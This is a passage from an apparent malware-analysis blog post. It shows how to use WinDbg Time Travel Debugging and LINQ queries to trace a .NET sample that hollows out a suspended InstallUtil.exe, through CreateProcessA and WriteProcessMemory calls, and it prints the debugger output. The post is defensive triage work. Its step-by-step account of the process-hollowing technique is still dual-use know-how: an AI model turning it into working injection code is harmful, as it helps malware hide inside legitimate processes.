vertical-align: baseline;\">time travel command</span></a><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">!tt</code><span style=\"vertical-align: baseline;\">) enables precise navigation to a specific trace position. These positions are often provided in the output of various TTD commands. A position in a TTD trace is represented by two hexadecimal numbers in the format </span><code style=\"vertical-align: baseline;\">#:#</code><span style=\"vertical-align: baseline;\"> (e.g., </span><code style=\"vertical-align: baseline;\">E:7D5</code><span style=\"vertical-align: baseline;\">) where:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The first part is a sequencing number typically corresponding to a major execution event, such as a module load or an exception.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The second part is a step count, indicating the number of events or instructions executed since that major execution event.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">We'll use the time travel command later in this post to jump directly to the critical events in our process hollowing example, bypassing manual instruction tracing entirely.</span></p>\n<h4><span style=\"vertical-align: baseline;\">The TTD Debugger Data Model</span></h4>\n<p><span style=\"vertical-align: baseline;\">The WinDbg debugger data model is an extensible object model that exposes debugger information as a navigable tree of objects. The debugger data model brings a fundamental shift in how users access debugger information in WinDbg, from wrangling raw text-based output to interacting with structured object information. The data model supports </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/using-linq-with-the-debugger-objects\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LINQ</span></a><span style=\"vertical-align: baseline;\"> for querying and filtering, allowing users to efficiently sort through large volumes of execution information. The debugger data model also simplifies automation through JavaScript, with APIs that mirror how you access the debugger data model through commands.</span></p>\n<p><span style=\"vertical-align: baseline;\">The </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/dx--display-visualizer-variables-\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Display Debugger Object Model Expression</span></a><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">(</code><code style=\"vertical-align: baseline;\">dx</code><code style=\"vertical-align: baseline;\">)</code><span style=\"vertical-align: baseline;\"> command is the primary way to interact with the debugger data model from the command window in WinDbg. The model lends itself to discoverability – you can begin traversing through it by starting at the root </span><code style=\"vertical-align: baseline;\">Debugger</code><span style=\"vertical-align: baseline;\"> object:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx Debugger\nDebugger\n    Sessions\n    Settings\n    State\n    Utility\n    LastEvent</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The command output lists the five objects that are properties of the </span><code style=\"vertical-align: baseline;\">Debugger</code><span style=\"vertical-align: baseline;\"> object. Note that the names in the output, which look like links, are marked up using the </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-markup-language-commands\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Debugger Markup Language</span></a><span style=\"vertical-align: baseline;\"> (DML). DML enriches the output with links that execute related commands. </span><span style=\"vertical-align: baseline;\">Clicking on the </span><code style=\"vertical-align: baseline;\">Sessions</code><span style=\"vertical-align: baseline;\"> object in the output executes the following </span><code style=\"vertical-align: baseline;\">dx</code><span style=\"vertical-align: baseline;\"> command to expand on that object:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -r1 Debugger.Sessions\nDebugger.Sessions                \n    [0x0]            : Time Travel Debugging: 0b631f91f02ca9cffd66e7c64ee11a4b.run</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The </span><code style=\"vertical-align: baseline;\">-r#</code><span style=\"vertical-align: baseline;\"> argument specifies recursion up to </span><code style=\"vertical-align: baseline;\">#</code><span style=\"vertical-align: baseline;\"> levels, with a default depth of one if not specified. For example, increasing the recursion to two levels in the previous command produces the following output:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -r2 Debugger.Sessions\nDebugger.Sessions                \n    [0x0]            : Time Travel Debugging: 0b631f91f02ca9cffd66e7c64ee11a4b.run\n        Processes       \n        Id               : 0\n        Diagnostics     \n        TTD             \n        OS              \n        Devices         \n        Attributes</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The </span><code style=\"vertical-align: baseline;\">-g</code><span style=\"vertical-align: baseline;\"> argument displays any iterable object into a data grid in which each element is a grid row and the child properties of each element are grid columns.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -g Debugger.Sessions</code></pre></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Grid view of Sessions, with truncated columns\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/time-travel-triage-fig4a.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: Grid view of Sessions, with truncated columns</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Debugger and User Variables</span></h4>\n<p><span style=\"vertical-align: baseline;\">WinDbg provides some predefined </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/using-linq-with-the-debugger-objects#system-defined-variables\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">debugger variables</span></a><span style=\"vertical-align: baseline;\"> for convenience which can be listed through the </span><code style=\"vertical-align: baseline;\">DebuggerVariables</code><span style=\"vertical-align: baseline;\"> property.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx Debugger.State.DebuggerVariables\nDebugger.State.DebuggerVariables                \n   cursession       : Time Travel Debugging: 0b631f91f02ca9cffd66e7c64ee11a4b.run\n    curprocess       : 0b631f91f02ca9cffd66e7c64ee11a4b.exe [Switch To]\n    curthread        [Switch To]\n    scripts         \n    scriptContents   : [object Object]\n    vars            \n    curstack        \n    curframe         : ntdll!LdrInitializeThunk [Switch To]\n    curregisters    \n    debuggerRootNamespace</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Frequently used variables include:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">@$cursession</code><span style=\"vertical-align: baseline;\">: The current debugger session. Equivalent to </span><code style=\"vertical-align: baseline;\">Debugger.Sessions[&lt;session&gt;]</code><span style=\"vertical-align: baseline;\">. Commonly used items include:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">@$cursession.Processes</code><span style=\"vertical-align: baseline;\">: List of processes in the session.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">@$cursession.TTD.Calls</code><span style=\"vertical-align: baseline;\">: Method to query calls that occurred during the trace.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">@$cursession.TTD.Memory</code><span style=\"vertical-align: baseline;\">: Method to query memory operations that occurred during the trace.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">@$curprocess</code><span style=\"vertical-align: baseline;\">: The current process. Equivalent to </span><code style=\"vertical-align: baseline;\">@$cursession.Processes[&lt;pid&gt;]</code><span style=\"vertical-align: baseline;\">. Frequently used items include:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">@$curprocess.Modules</code><span style=\"vertical-align: baseline;\">: List of currently loaded modules.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">@$curprocess.TTD.Events</code><span style=\"vertical-align: baseline;\">: List of events that occurred during the trace.</span></p>\n</li>\n</ul>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Investigating the Debugger Data Model to Identify Process Hollowing</span></h3>\n<p><span style=\"vertical-align: baseline;\">With a basic understanding of TTD concepts and a trace ready for investigation, we can now look for evidence of process hollowing. To begin, the </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/time-travel-debugging-calls-objects\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">Calls</code></a><span style=\"vertical-align: baseline;\"> method can be used to search for specific Windows API calls. This search is effective even with a .NET sample because the managed code must interface with the unmanaged Windows API through </span><code style=\"vertical-align: baseline;\">P/Invoke</code><span style=\"vertical-align: baseline;\"> to perform a technique like process hollowing.</span></p>\n<p><span style=\"vertical-align: baseline;\">Process hollowing begins with the creation of a process in a suspended state via a call to </span><a href=\"https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">CreateProcess</code></a><span style=\"vertical-align: baseline;\"> with a creation flag value of </span><code style=\"vertical-align: baseline;\">0x4</code><span style=\"vertical-align: baseline;\">. The following query uses the </span><code style=\"vertical-align: baseline;\">Calls</code><span style=\"vertical-align: baseline;\"> method to return a table of each call to the </span><code style=\"vertical-align: baseline;\">kernel32</code><span style=\"vertical-align: baseline;\"> module’s </span><code style=\"vertical-align: baseline;\">CreateProcess*</code><span style=\"vertical-align: baseline;\"> in the trace; the wildcard (</span><code style=\"vertical-align: baseline;\">*</code><span style=\"vertical-align: baseline;\">) ensures the query matches calls to either </span><code style=\"vertical-align: baseline;\">CreateProcessA</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">CreateProcessW</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -g @$cursession.TTD.Calls(\"kernel32!CreateProcess*\")</code></pre></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"ttd fig 5\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/time-travel-triage-fig5a.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This query returns a number of fields, not all of which are helpful for our investigation. To address this, we can apply the </span><a href=\"https://learn.microsoft.com/en-us/dotnet/api/system.linq.enumerable.select?view=net-9.0\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">Select</code></a><span style=\"vertical-align: baseline;\"> LINQ query to the original query, which allows us to specify which columns to display and rename them.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -g @$cursession.TTD.Calls(\"kernel32!CreateProcess*\").Select(c =&gt; new { TimeStart = c.TimeStart, Function = c.Function, Parameters = c.Parameters, ReturnAddress = c.ReturnAddress})</code></pre></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"ttd fig 6\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/time-travel-triage-fig6a.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The result shows one call to </span><code style=\"vertical-align: baseline;\">CreateProcessA</code><span style=\"vertical-align: baseline;\"> starting at position </span><code style=\"vertical-align: baseline;\">58243:104D</code><span style=\"vertical-align: baseline;\">. Note the return address: since this is a .NET binary, the native code executed by the Just-In-Time (JIT) compiler won't be located in the application's main image address space (as it would be in a non-.NET image). Normally, an effective triage step is to filter results with a </span><a href=\"https://learn.microsoft.com/en-us/dotnet/api/system.linq.enumerable.where?view=net-9.0\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Where</span></a><span style=\"vertical-align: baseline;\"> LINQ query, limiting the return address to the primary module to filter out API calls that do not originate from the malware. This </span><code style=\"vertical-align: baseline;\">Where</code><span style=\"vertical-align: baseline;\"> filter, however, is less reliable when analyzing JIT-compiled code due to the dynamic nature of its execution space.</span></p>\n<p><span style=\"vertical-align: baseline;\">The next point of interest is the </span><code style=\"vertical-align: baseline;\">Parameters</code><span style=\"vertical-align: baseline;\"> field. Clicking on the DML link on the collapsed value </span><span style=\"vertical-align: baseline;\">{..}</span><span style=\"vertical-align: baseline;\"> displays </span><code style=\"vertical-align: baseline;\">Parameters</code><span style=\"vertical-align: baseline;\"> via a corresponding </span><span style=\"vertical-align: baseline;\">dx</span><span style=\"vertical-align: baseline;\"> command.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -r1 @$cursession.TTD.Calls(\"kernel32!CreateProcess*\").Select( c =&gt; new { TimeStart = c.TimeStart, Parameters = c.Parameters, ReturnAddress = c.ReturnAddress})[0].Parameters\n\n@$cursession.TTD.Calls(\"kernel32!CreateProcess*\").Select( c =&gt; new { TimeStart = c.TimeStart, Parameters = c.Parameters, ReturnAddress = c.ReturnAddress})[0].Parameters\n    [0x0]            : 0x55de700055de74\n    [0x1]            : 0x55e0780055e0ac\n    [0x2]            : 0x808000400000000\n    [0x3]            : 0x55de4000000000</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Function arguments are available under a specific </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/time-travel-debugging-calls-objects\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">Calls</code></a><span style=\"vertical-align: baseline;\"> object as an array of values. However, before we investigate the parameters, there are some assumptions made by TTD that are worth exploring. Overall, these assumptions are affected by whether the process is 32-bit or 64-bit. An easy way to check the bitness of the process is by inspecting the </span><code style=\"vertical-align: baseline;\">DebuggerInformation</code><span style=\"vertical-align: baseline;\"> object.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:00&gt; dx Debugger.State.DebuggerInformation\nDebugger.State.DebuggerInformation                \n    ProcessorTarget  : X86 &lt;--- Process Bitness\n    Bitness          : 32\n    EngineFilePath   : C:\\Program Files\\WindowsApps\\&lt;SNIPPED&gt;\\x86\\dbgeng.dll\n    EngineVersion    : 10.0.27871.1001</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The key identifier in the output is </span><code style=\"vertical-align: baseline;\">ProcessorTarget</code><span style=\"vertical-align: baseline;\">: this value indicates the architecture of the guest process that was traced, regardless of whether the host operating system running the debugger is 64-bit.</span></p>\n<p><span style=\"vertical-align: baseline;\">TTD uses symbol information provided in a program database (PDB) file to determine the number of parameters, their types and the return type of a function. However, this information is only available if the PDB file contains </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/public-and-private-symbols\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">private symbols</span></a><span style=\"vertical-align: baseline;\">. While Microsoft provides PDB files for many of its libraries, these are often public symbols and therefore lack the necessary function information to interpret the parameters correctly. This is where TTD makes another assumption that can lead to incorrect results. Primarily, it </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/time-travel-debugging-calls-objects\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">assumes</span></a><span style=\"vertical-align: baseline;\"> a maximum of four QWORD parameters and that the return value is also a QWORD. This assumption creates a mismatch in a 32-bit process (x86), where arguments are typically 32-bit (4-byte) values passed on the stack. Although TTD correctly finds the arguments on the stack, it misinterprets two adjacent 32-bit arguments as a single, 64-bit value.</span></p>\n<p><span style=\"vertical-align: baseline;\">One way to resolve this is to manually investigate the arguments on the stack. First we use the </span><code style=\"vertical-align: baseline;\">!tt</code><span style=\"vertical-align: baseline;\"> command to navigate to the beginning of the relevant call to </span><code style=\"vertical-align: baseline;\">CreateProcessA</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; !tt 58243:104D\n\n(b48.12a4): Break instruction exception - code 80000003 (first/second chance not available)\nTime Travel Position: 58243:104D\neax=00bed5c0 ebx=039599a8 ecx=00000000 edx=75d25160 esi=00000000 edi=03331228\neip=75d25160 esp=0055de14 ebp=0055df30 iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\nKERNEL32!CreateProcessA:\n75d25160 8bff            mov     edi,edi</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The return address is at the top of the stack at the start of a function call, so the following </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/d--da--db--dc--dd--dd--df--dp--dq--du--dw--dw--dyb--dyd--display-memor\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">dd command</span></a><span style=\"vertical-align: baseline;\"> skips over this value by adding an offset of </span><code style=\"vertical-align: baseline;\">4</code><span style=\"vertical-align: baseline;\"> to the </span><code style=\"vertical-align: baseline;\">ESP</code><span style=\"vertical-align: baseline;\"> register to properly align the function arguments.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dd /c 1 esp+4 L0A\n0055de18  0055de74  &lt;-- Application Name\n0055de1c  0055de70\n0055de20  0055e0ac\n0055de24  0055e078\n0055de28  00000000\n0055de2c  08080004  &lt;-- Creation Flags - 0x4 (CREATE_SUSPENDED)\n0055de30  00000000\n0055de34  0055de40\n0055de38  0055e0c0\n0055de3c  0055e068</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The value of </span><code style=\"vertical-align: baseline;\">0x4</code><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">CREATE_SUSPENDED</code><span style=\"vertical-align: baseline;\">) set in the bitmask for the </span><a href=\"https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">dwCreationFlags</code><span style=\"text-decoration: underline; vertical-align: baseline;\"> argument</span></a><span style=\"vertical-align: baseline;\"> (6th argument) indicates that the process will be created in a suspended state.</span></p>\n<p><span style=\"vertical-align: baseline;\">The following command dereferences </span><code style=\"vertical-align: baseline;\">esp+4</code><span style=\"vertical-align: baseline;\"> via the </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/address-and-address-range-syntax\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">poi</code><span style=\"text-decoration: underline; vertical-align: baseline;\"> operator</span></a><span style=\"vertical-align: baseline;\"> to retrieve the application name string pointer then uses the </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/d--da--db--dc--dd--dd--df--dp--dq--du--dw--dw--dyb--dyd--display-memor\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">da</code><span style=\"text-decoration: underline; vertical-align: baseline;\"> command</span></a><span style=\"vertical-align: baseline;\"> to display the ASCII string.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; da poi(esp+4)\n0055de74  \"C:\\Windows\\Microsoft.NET\\Framewo\"\n0055de94  \"rk\\v4.0.30319\\InstallUtil.exe\"</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The command reveals that the target application is </span><code style=\"vertical-align: baseline;\">InstallUtil.exe</code><span style=\"vertical-align: baseline;\">, which aligns with the findings from basic analysis.</span></p>\n<p><span style=\"vertical-align: baseline;\">It is also useful to retrieve the handle to the newly created process in order to identify subsequent operations performed on it. The handle value is returned through a pointer (</span><code style=\"vertical-align: baseline;\">0x55e068</code><span style=\"vertical-align: baseline;\"> in the earlier referenced output) to a </span><code style=\"vertical-align: baseline;\">PROCESS_INFORMATION</code><span style=\"vertical-align: baseline;\"> structure passed as the last argument. This structure has the following definition:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>typedef struct _PROCESS_INFORMATION {\n  HANDLE hProcess;\n  HANDLE hThread;\n  DWORD  dwProcessId;\n  DWORD  dwThreadId;\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">After the call to </span><code style=\"vertical-align: baseline;\">CreateProcessA</code><span style=\"vertical-align: baseline;\">, the first member of this structure should be populated with the handle to the process. Step out of the call using the </span><code style=\"vertical-align: baseline;\">gu</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">(Go Up) command to examine the populated structure.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; gu\nTime Travel Position: 58296:60D\n\n0:000&gt; dd /c 1 0x55e068 L4\n0055e068  00000104 &lt;-- handle to process\n0055e06c  00000970\n0055e070  00000d2c\n0055e074  00001c30</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In this trace, </span><code style=\"vertical-align: baseline;\">CreateProcess</code><span style=\"vertical-align: baseline;\"> returned </span><code style=\"vertical-align: baseline;\">0x104</code><span style=\"vertical-align: baseline;\"> as the handle for the suspended process.</span></p>\n<p><span style=\"vertical-align: baseline;\">The most interesting operation in process hollowing for the purpose of triage is the allocation of memory and subsequent writes to that memory, commonly performed via calls to </span><a href=\"https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">WriteProcessMemory</code></a><span style=\"vertical-align: baseline;\">. The previous </span><code style=\"vertical-align: baseline;\">Calls</code><span style=\"vertical-align: baseline;\"> query can be updated to identify calls to </span><code style=\"vertical-align: baseline;\">WriteProcessMemory</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -g @$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})\n=============================================================\n=          = (+) TimeStart = (+) ReturnAddress = (+) Params =\n=============================================================\n= [0x0]    - 6A02A:4B4     - 0x15032e2         - {...}      =\n= [0x1]    - 6E516:A91     - 0x15032e2         - {...}      =\n= [0x2]    - 729A2:511     - 0x15032e2         - {...}      =\n= [0x3]    - 76E2D:750     - 0x15032e2         - {...}      =\n= [0x4]    - 7B2DF:C1C     - 0x15032e2         - {...}      =\n=============================================================\n</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The query returns four results. The following queries expand the arguments for each call to </span><code style=\"vertical-align: baseline;\">WriteProcessMemory</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -r1 @$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[0].Params\n@$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[0].Params                \n    [0x0]            : 0x104        &lt;-- Target process handle\n    [0x1]            : 0x400000     &lt;-- Target Address\n    [0x2]            : 0x9810af0    &lt;-- Source buffer\n    [0x3]            : 0x200        &lt;-- Write size\n\n0:000&gt; dx -r1 @$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[1].Params\n@$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[1].Params                \n    [0x0]            : 0x104\n    [0x1]            : 0x402000\n    [0x2]            : 0x984cb10\n    [0x3]            : 0x3b600\n\n0:000&gt; dx -r1 @$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[2].Params\n@$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[2].Params                \n    [0x0]            : 0x104\n    [0x1]            : 0x43e000\n    [0x2]            : 0x387d9d0\n    [0x3]            : 0x600\n\n0:000&gt; dx -r1 @$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[3].Params\n@$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[3].Params                \n    [0x0]            : 0x104\n    [0x1]            : 0x440000\n    [0x2]            : 0x3927a78\n    [0x3]            : 0x200</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><code style=\"vertical-align: baseline;\">WriteProcessMemory</code><span style=\"vertical-align: baseline;\"> has the following function signature:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>BOOL WriteProcessMemory(\n  [in]  HANDLE  hProcess,\n  [in]  LPVOID  lpBaseAddress,\n  [in]  LPCVOID lpBuffer,\n  [in]  SIZE_T  nSize,\n  [out] SIZE_T  *lpNumberOfBytesWritten\n);</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Investigating these calls to </span><code style=\"vertical-align: baseline;\">WriteProcessMemory</code><span style=\"vertical-align: baseline;\"> shows that the target process handle is </span><code style=\"vertical-align: baseline;\">0x104</code><span style=\"vertical-align: baseline;\">, which represents the suspended process. The second argument defines the address in the target process. The arguments to these calls reveal a pattern common to PE loading: the malware writes the PE header followed by the relevant sections at their virtual offsets.</span></p>\n<p><span style=\"vertical-align: baseline;\">It is worth noting that the memory of the target process cannot be analyzed from this trace. To record the execution of a child process, pass the </span><code style=\"vertical-align: baseline;\">-children</code><span style=\"vertical-align: baseline;\"> flag to the </span><code style=\"vertical-align: baseline;\">TTD.exe</code><span style=\"vertical-align: baseline;\"> utility. This will generate a trace file for each process, including all child processes, spawned during execution.</span></p>\n<p><span style=\"vertical-align: baseline;\">The first memory write to what is likely the target process's base address (</span><code style=\"vertical-align: baseline;\">0x400000</code><span style=\"vertical-align: baseline;\">) is </span><code style=\"vertical-align: baseline;\">0x200</code><span style=\"vertical-align: baseline;\"> bytes. This size is consistent with a PE header, and examining the source buffer (</span><code style=\"vertical-align: baseline;\">0x9810af0</code><span style=\"vertical-align: baseline;\">) confirms its contents.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; db 0x9810af0\n09810af0  4d 5a 90 00 03 00 00 00-04 00 00 00 ff ff 00 00  MZ..............\n09810b00  b8 00 00 00 00 00 00 00-40 00 00 00 00 00 00 00  ........@.......\n09810b10  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n09810b20  00 00 00 00 00 00 00 00-00 00 00 00 80 00 00 00  ................\n09810b30  0e 1f ba 0e 00 b4 09 cd-21 b8 01 4c cd 21 54 68  ........!..L.!Th\n09810b40  69 73 20 70 72 6f 67 72-61 6d 20 63 61 6e 6e 6f  is program canno\n09810b50  74 20 62 65 20 72 75 6e-20 69 6e 20 44 4f 53 20  t be run in DOS \n09810b60  6d 6f 64 65 2e 0d 0d 0a-24 00 00 00 00 00 00 00  mode....$.......</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/-dh\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">!dh</code><span style=\"text-decoration: underline; vertical-align: baseline;\"> extension</span></a><span style=\"vertical-align: baseline;\"> can be used to parse this header information.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; !dh 0x9810af0\n\nFile Type: EXECUTABLE IMAGE\nFILE HEADER VALUES\n     14C machine (i386)\n       3 number of sections\n66220A8D time date stamp Fri Apr 19 06:09:17 2024\n\n----- SNIPPED -----\n\nOPTIONAL HEADER VALUES\n     10B magic #\n   11.00 linker version\n         ----- SNIPPED -----\n       0 [       0] address [size] of Export Directory\n   3D3D4 [      57] address [size] of Import Directory\n   ----- SNIPPED 